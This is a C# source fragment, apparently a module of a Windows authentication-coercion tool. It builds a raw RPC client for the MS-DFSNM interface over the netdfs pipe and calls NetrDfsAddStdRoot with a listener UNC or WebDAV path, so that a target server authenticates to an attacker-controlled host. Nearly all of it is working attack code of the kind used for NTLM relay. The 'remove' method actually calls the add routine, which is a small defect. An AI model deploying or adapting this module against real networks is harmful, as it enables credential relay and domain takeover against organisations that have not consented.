0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x19, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x06, 0x00, 0x4c, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x08, 0x00, 0x0d, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x06, 0x00, 0x12, 0x81, 0x18, 0x00, 0x92, 0x05, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00 };

        public string Name => "MS-DFSNM";

        public string Description => "An RPC interface through which clients remotely configure and manage DFS namespaces";

        public bool HttpCoerce => false;
        public DfsRpcClient()
        {
            _interfaceId = new Guid("4fc742e0-4a10-11cf-8273-00aa004ae673");
            _pipeName = "\\pipe\\netdfs";
            BuildStub(MIDL_TypeFormatStringx64, MIDL_ProcFormatStringx64, 3, 0);
        }
        private void BuildStub(byte[] mIDL_TypeFormatString, byte[] mIDL_ProcFormatString, ushort MajorVerson, ushort MinorVersion)
        {
            _midl_typeFromat = mIDL_TypeFormatString;
            _midl_procFromat = mIDL_ProcFormatString;


            //rpc interface
            var rpcClientInterface = new RpcClientInterface(_interfaceId, MajorVerson, MinorVersion);
            clientInterface = GCHandle.Alloc(rpcClientInterface, GCHandleType.Pinned);

            formatString = GCHandle.Alloc(_midl_typeFromat, GCHandleType.Pinned);


            var stubObject = new MidlStubDesc(formatString.AddrOfPinnedObject(),
                                                            clientInterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate),
                                                            IntPtr.Zero,
                                                            0x8010274);


            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);

        }


        public IntPtr Bind(IntPtr hComputer)
        {

            string server = Marshal.PtrToStringUni(hComputer);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            int status;

            Console.WriteLine("Binding to " + server + " " + _pipeName);
            status = Rpcrt4.RpcStringBindingCompose(null, "ncacn_np", server, _pipeName, null, out bindingstring);
            if (status != 0)
            {
                Trace.WriteLine("RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }


            status = Rpcrt4.RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            Rpcrt4.RpcBindingFree(ref bindingstring);

            if (status != 0)
            {
                Trace.WriteLine("RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            Console.WriteLine("binding ok (handle=" + binding + ")");
            return binding;
        }


        public int NetrDfsRemoveStdRoot(IntPtr hBind, string computername, string lisenter)
        {
            IntPtr result = IntPtr.Zero;
            try
            {
                result = Rpcrt4.NetrDfsAddStdRoot(GetStubHandle(), GetProcStringHandle(714), hBind, lisenter,"test\\","",1);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]NetrDfsRemoveStdRoot failed: " + err);
                return err;
            }
      
            return (int)result.ToInt64();
        }

        public int NetrDfsAddStdRoot(IntPtr hBind,string computername, string url)
        {
            IntPtr result = IntPtr.Zero;
            try
            {
                result = Rpcrt4.NetrDfsAddStdRoot(GetStubHandle(), GetProcStringHandle(714), hBind, url, "test\\","", 1);

            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Trace.WriteLine("[x]NetrDfsAddStdRoot failed: " + err);
                return err;
            }
            return (int)result.ToInt64();
        }

        public string BuildURL(string listener, int smbport = 445, int httpport = 80, bool isHttp = false)
        {

            //if http is used 
            if (isHttp)
                return $"\\\\{listener}@{httpport}/{RandomStringGenerator.Generate(3)}";



            //if default smb port is used
            if (smbport == 445)
                return $"\\\\{listener}\\NETLOGON";


            //Return the URL for the SMB share with a specific port
            return $"\\\\{listener}@{smbport}\\NETLOGON";
        }

        public CoerceFunction[] GetFunctions()
        {
            return new CoerceFunction[]
            {
                new CoerceFunction(this, NetrDfsRemoveStdRoot, nameof(NetrDfsRemoveStdRoot), BuildURL),
                new CoerceFunction(this, NetrDfsAddStdRoot, nameof(NetrDfsAddStdRoot), BuildURL)
            };
        }

    }
}
